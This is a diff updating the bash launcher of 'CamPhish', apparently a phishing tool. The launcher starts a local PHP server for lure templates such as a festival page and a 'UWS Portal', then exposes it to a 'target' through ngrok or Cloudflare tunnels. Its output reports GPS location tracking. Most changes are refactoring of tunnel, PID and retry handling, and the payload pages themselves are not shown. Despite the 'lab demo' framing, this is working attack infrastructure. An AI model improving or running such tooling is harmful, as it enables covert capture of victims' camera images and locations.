@@ -1,6 +1,10 @@
-#!/bin/bash
-# CamPhish v2.0
-# Powered by TechChip
+#!/usr/bin/env bash
+# CamPhish v3.0
+# Updated by Tahir Siddique | Original by TechChip
+
+if [[ -z "${BASH_VERSION:-}" ]]; then
+exec bash "$0" "$@"
+fi
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -26,6 +30,10 @@ else
   windows_mode=false
 fi
 
+CAMPHISH_PORT=3333
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+cd "$SCRIPT_DIR" || exit 1
+
 trap 'printf "\n";stop' 2
 
 banner() {
@@ -38,9 +46,8 @@ printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | 
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
-printf " \e[1;96m Lab Demo by Tahir Siddique \e[0m \n"
+printf " \e[1;93m CamPhish Ver 3.0 \e[0m \n"
+printf " \e[1;96m Updated by Tahir Siddique \e[0m \n"
 
 printf "\n"
 
@@ -48,7 +55,38 @@ printf "\n"
 }
 
 dependencies() {
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+local missing=""
+for cmd in php curl wget sed grep; do
+command -v "$cmd" > /dev/null 2>&1 || missing="$missing $cmd"
+done
+if [[ -n "$missing" ]]; then
+printf "\e[1;31m[!] Missing required tools:%s\e[0m\n" "$missing"
+if [[ "$windows_mode" == false ]]; then
+printf "\e[1;93m[\e[0m!\e[1;93m] On Kali/Debian/Ubuntu run:\e[0m\n"
+printf "    sudo apt-get update && sudo apt-get install -y php curl wget sed grep procps\n"
+fi
+exit 1
+fi
+}
+
+read_pid_file() {
+local pidfile="$1"
+local pid=""
+[[ -f "$pidfile" ]] || return 1
+pid=$(tr -d '\r\n ' < "$pidfile")
+[[ "$pid" =~ ^[0-9]+$ ]] || return 1
+printf '%s' "$pid"
+}
+
+kill_by_name() {
+local signal="$1"
+local name="$2"
+if command -v pkill > /dev/null 2>&1; then
+pkill "-${signal}" -f "$name" > /dev/null 2>&1
+fi
+if command -v killall > /dev/null 2>&1; then
+killall "-${signal}" "$name" > /dev/null 2>&1
+fi
 }
 
 get_cloudflare_link() {
@@ -71,34 +109,22 @@ fi
 return 1
 }
 
-wait_for_cloudflare_link() {
-local logfile="$1"
-local attempt=0
-local link=""
-while [[ $attempt -lt 30 ]]; do
-link=$(get_cloudflare_link "$logfile")
-if [[ -n "$link" ]]; then
-printf "%s" "$link"
-return 0
-fi
-sleep 2
-attempt=$((attempt + 1))
-done
-return 1
-}
-
 cleanup_stale_servers() {
 if [[ "$windows_mode" == true ]]; then
 taskkill /F /IM "php.exe" 2>/dev/null
 taskkill /F /IM "cloudflared.exe" 2>/dev/null
 taskkill /F /IM "ngrok.exe" 2>/dev/null
 else
-pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
-pkill -f "cloudflared tunnel" > /dev/null 2>&1
-pkill -f "ngrok http" > /dev/null 2>&1
-killall -2 cloudflared > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
+if [[ -f ".php-server.pid" ]]; then
+pid=$(read_pid_file ".php-server.pid")
+[[ -n "$pid" ]] && kill "$pid" 2>/dev/null
+rm -f .php-server.pid
 fi
+pkill -f "php -S .*:${CAMPHISH_PORT}" > /dev/null 2>&1
+kill_by_name 2 cloudflared
+kill_by_name 2 ngrok
+fi
+rm -f .php-server.log
 sleep 1
 }
 
@@ -274,75 +300,125 @@ fi
 cloudflared_is_running() {
 local pid=""
 if [[ -f ".cloudflared.pid" ]]; then
-pid=$(cat .cloudflared.pid 2>/dev/null)
+pid=$(read_pid_file ".cloudflared.pid")
 if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
 return 0
 fi
 fi
-if pgrep -f "cloudflared tunnel.*127.0.0.1:3333" > /dev/null 2>&1; then
-return 0
+if command -v pgrep > /dev/null 2>&1; then
+pgrep -f "cloudflared tunnel.*127.0.0.1:${CAMPHISH_PORT}" > /dev/null 2>&1 && return 0
 fi
+ps aux 2>/dev/null | grep -v grep | grep -q "cloudflared tunnel" && return 0
 return 1
 }
 
 stop_cloudflared_only() {
+local pid=""
 if [[ -f ".cloudflared.pid" ]]; then
-kill "$(cat .cloudflared.pid)" 2>/dev/null
+pid=$(read_pid_file ".cloudflared.pid")
+[[ -n "$pid" ]] && kill "$pid" 2>/dev/null
 rm -f .cloudflared.pid
 fi
-pkill -f "cloudflared tunnel.*127.0.0.1:3333" > /dev/null 2>&1
-killall -2 cloudflared > /dev/null 2>&1
+pkill -f "cloudflared tunnel.*127.0.0.1:${CAMPHISH_PORT}" > /dev/null 2>&1
+kill_by_name 2 cloudflared
 sleep 1
 }
 
 verify_php_server() {
 if command -v curl > /dev/null 2>&1; then
-curl -s -o /dev/null -m 3 http://127.0.0.1:3333/ 2>/dev/null
+curl -s -o /dev/null -m 3 "http://127.0.0.1:${CAMPHISH_PORT}/" 2>/dev/null
 return $?
 fi
 if command -v nc > /dev/null 2>&1; then
-nc -z 127.0.0.1 3333 > /dev/null 2>&1
+nc -z 127.0.0.1 "$CAMPHISH_PORT" > /dev/null 2>&1
 return $?
 fi
 sleep 1
 return 0
 }
 
-start_cloudflared_tunnel() {
-local cf_bin link proto attempt
-cf_bin=$(cloudflared_bin)
-rm -f .cloudflared.log .cloudflared.out .cloudflared.pid .tunnel.link
-mkdir -p .camphish-cloudflared
+start_php_server() {
+local bind_address="${1:-127.0.0.1}"
+cleanup_stale_servers
+printf "\e[1;92m[\e[0m+\e[1;92m] Step 1: Starting local PHP server on %s:%s...\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
+printf "\e[1;77m    (Same as: php -S %s:%s -t .)\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
+php -S "${bind_address}:${CAMPHISH_PORT}" -t . > .php-server.log 2>&1 &
+echo $! > .php-server.pid
+sleep 2
+if ! verify_php_server; then
+printf "\e[1;31m[!] Local PHP server failed to start.\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] Try manually in this folder: php -S %s:%s -t .\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
+return 1
+fi
+printf "\e[1;92m[\e[0m*\e[1;92m] Local server running at http://127.0.0.1:%s\e[0m\n" "$CAMPHISH_PORT"
+return 0
+}
 
-for proto in auto http2 quic; do
-stop_cloudflared_only
+start_ngrok_tunnel() {
+local ngrok_bin="$1"
+local ngrok_config="$2"
+printf "\e[1;92m[\e[0m+\e[1;92m] Step 2: Starting ngrok tunnel to local port %s...\e[0m\n" "$CAMPHISH_PORT"
+printf "\e[1;77m    (Same as: %s http %s --config=%s)\e[0m\n" "$ngrok_bin" "$CAMPHISH_PORT" "$ngrok_config"
+rm -f .ngrok.log .ngrok.pid
+nohup "$ngrok_bin" http "$CAMPHISH_PORT" --config="$ngrok_config" --log=stdout > .ngrok.log 2>&1 &
+echo $! > .ngrok.pid
+sleep 3
+}
+
+start_cloudflared_tunnel() {
+local cf_bin="$1"
+local proto="${2:-auto}"
+mkdir -p .camphish-cloudflared
+rm -f .cloudflared.out .cloudflared.pid
 
 if [[ "$proto" == "auto" ]]; then
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n" >&2
-nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info > .cloudflared.out 2>&1 &
+printf "\e[1;92m[\e[0m+\e[1;92m] Step 2: Starting cloudflared tunnel to local port %s...\e[0m\n" "$CAMPHISH_PORT"
+printf "\e[1;77m    (Same as: %s tunnel --url http://127.0.0.1:%s)\e[0m\n" "$cf_bin" "$CAMPHISH_PORT"
+nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url "http://127.0.0.1:${CAMPHISH_PORT}" --loglevel info > .cloudflared.out 2>&1 &
 else
-printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto" >&2
-nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --protocol "$proto" --loglevel info > .cloudflared.out 2>&1 &
+printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto"
+printf "\e[1;77m    (Same as: %s tunnel --url http://127.0.0.1:%s --protocol %s)\e[0m\n" "$cf_bin" "$CAMPHISH_PORT" "$proto"
+nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url "http://127.0.0.1:${CAMPHISH_PORT}" --protocol "$proto" --loglevel info > .cloudflared.out 2>&1 &
 fi
 
 echo $! > .cloudflared.pid
 sleep 3
+}
 
-for attempt in $(seq 1 20); do
-if ! cloudflared_is_running; then
-break
+wait_for_cloudflare_tunnel() {
+local attempt=0
+local link=""
+while [[ $attempt -lt 30 ]]; do
+if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
+return 1
 fi
 link=$(get_cloudflare_link ".cloudflared.out")
-if [[ -n "$link" ]]; then
+if [[ -n "$link" ]] && cloudflared_is_running; then
+printf '%s' "$link"
+return 0
+fi
 sleep 2
-if cloudflared_is_running; then
+attempt=$((attempt + 1))
+done
+return 1
+}
+
+launch_cloudflared_with_retry() {
+local cf_bin link proto
+cf_bin=$(cloudflared_bin)
+rm -f .cloudflared.log .tunnel.link
+
+for proto in auto http2 quic; do
+if [[ "$proto" != "auto" ]]; then
+stop_cloudflared_only
+fi
+start_cloudflared_tunnel "$cf_bin" "$proto"
+link=$(wait_for_cloudflare_tunnel)
+if [[ -n "$link" ]]; then
 printf '%s' "$link" > .tunnel.link
 return 0
 fi
-break
-fi
-sleep 2
-done
+stop_cloudflared_only
 done
 
 return 1
@@ -350,31 +426,12 @@ return 1
 
 stop() {
 if [[ "$windows_mode" == true ]]; then
-  # Windows-specific process termination
-  taskkill /F /IM "ngrok.exe" 2>/dev/null
-  taskkill /F /IM "php.exe" 2>/dev/null
-  taskkill /F /IM "cloudflared.exe" 2>/dev/null
+taskkill /F /IM "ngrok.exe" 2>/dev/null
+taskkill /F /IM "php.exe" 2>/dev/null
+taskkill /F /IM "cloudflared.exe" 2>/dev/null
 else
-  # Unix-like systems
-  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-  checkphp=$(ps aux | grep -o "php" | head -n1)
-  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)
-
-  if [[ $checkngrok == *'ngrok'* ]]; then
-    pkill -f -2 ngrok > /dev/null 2>&1
-    killall -2 ngrok > /dev/null 2>&1
-  fi
-
-  if [[ $checkphp == *'php'* ]]; then
-    killall -2 php > /dev/null 2>&1
-  fi
-
-  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
-    pkill -f -2 cloudflared > /dev/null 2>&1
-    killall -2 cloudflared > /dev/null 2>&1
-  fi
+cleanup_stale_servers
 fi
-
 exit 1
 }
 
@@ -438,7 +495,7 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1
 if [[ -f ".cloudflared.pid" ]]; then
 printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open or the Cloudflare tunnel will stop (Error 1033).\e[0m\n"
 fi
-while [ true ]; do
+while true; do
 
 if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
 printf "\n\e[1;31m[!] cloudflared stopped running! Tunnel is down (Error 1033).\e[0m\n"
@@ -569,21 +626,15 @@ else
 fi
 fi
 
-cleanup_stale_servers
 check_cloudflared_config_conflict
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-sleep 2
-
-if ! verify_php_server; then
-printf "\e[1;31m[!] PHP server failed to start on 127.0.0.1:3333\e[0m\n"
+if ! start_php_server "127.0.0.1"; then
 restore_cloudflared_config
 exit 1
 fi
 
-if start_cloudflared_tunnel; then
-link=$(cat .tunnel.link)
+if launch_cloudflared_with_retry; then
+link=$(tr -d '\r\n ' < .tunnel.link)
 else
 link=""
 fi
@@ -593,7 +644,9 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might b
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m cloudflared process crashed after starting\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m University/lab firewall may block port 7844 (TCP+UDP)\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try Ngrok instead (option 1) — often works better on campus networks\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test: ./cloudflared tunnel --url http://127.0.0.1:3333\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test:\e[0m\n"
+printf "\e[1;77m    php -S 127.0.0.1:%s -t .\e[0m\n" "$CAMPHISH_PORT"
+printf "\e[1;77m    ./cloudflared tunnel --url http://127.0.0.1:%s\e[0m\n" "$CAMPHISH_PORT"
 if [[ -f ".cloudflared.out" ]]; then
 printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared output (last 15 lines):\e[0m\n"
 tail -n 15 .cloudflared.out
@@ -621,7 +674,10 @@ payload_site "$link"
 
 local_network_server() {
 local local_ip link
-cleanup_stale_servers
+
+if ! start_php_server "0.0.0.0"; then
+exit 1
+fi
 
 local_ip=$(get_local_ip)
 if [[ -z "$local_ip" ]]; then
@@ -629,16 +685,7 @@ printf "\e[1;31m[!] Could not detect your local IP address.\e[0m\n"
 exit 1
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on all interfaces (0.0.0.0:3333)...\n"
-php -S 0.0.0.0:3333 > /dev/null 2>&1 &
-sleep 2
-
-if ! verify_php_server; then
-printf "\e[1;31m[!] PHP server failed to start on port 3333\e[0m\n"
-exit 1
-fi
-
-link="http://${local_ip}:3333"
+link="http://${local_ip}:${CAMPHISH_PORT}"
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
 printf "\e[1;93m[\e[0m!\e[1;93m] Local network mode — target must be on the SAME WiFi/LAN as this machine.\e[0m\n"
 printf "\e[1;93m[\e[0m!\e[1;93m] Best option for university lab demos when ngrok/cloudflare are blocked.\e[0m\n"
@@ -732,8 +779,6 @@ else
 fi
 fi
 
-cleanup_stale_servers
-
 local ngrok_bin ngrok_config
 if [[ "$windows_mode" == true ]]; then
 ngrok_bin="./ngrok.exe"
@@ -746,13 +791,11 @@ if ! setup_ngrok_auth "$ngrok_bin"; then
 exit 1
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-rm -f .ngrok.log
+if ! start_php_server "127.0.0.1"; then
+exit 1
+fi
 
-"$ngrok_bin" http 127.0.0.1:3333 --config="$ngrok_config" --log=stdout > .ngrok.log 2>&1 &
+start_ngrok_tunnel "$ngrok_bin" "$ngrok_config"
 
 link=$(wait_for_ngrok_link)
 if [[ -z "$link" ]]; then
@@ -761,7 +804,9 @@ if ! show_ngrok_failure; then
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken may be missing or invalid\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Get a free token: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try option 03 (Local Network) for lab demos\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try manually: %s http 127.0.0.1:3333 --config=%s\e[0m\n" "$ngrok_bin" "$ngrok_config"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test:\e[0m\n"
+printf "\e[1;77m    php -S 127.0.0.1:%s -t .\e[0m\n" "$CAMPHISH_PORT"
+printf "\e[1;77m    %s http %s --config=%s\e[0m\n" "$ngrok_bin" "$CAMPHISH_PORT" "$ngrok_config"
 fi
 if [[ -f ".ngrok.log" ]]; then
 printf "\e[1;93m[\e[0m!\e[1;93m] ngrok log (last 10 lines):\e[0m\n"
@@ -787,6 +832,7 @@ printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Local Network (Lab D
 default_option_server="3"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 3] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
+option_server=$((10#${option_server}))
 select_template
 
 if [[ $option_server -eq 2 ]]; then
@@ -819,6 +865,7 @@ printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m UWS Portal\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
+option_tem=$((10#${option_tem}))
 if [[ $option_tem -eq 1 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
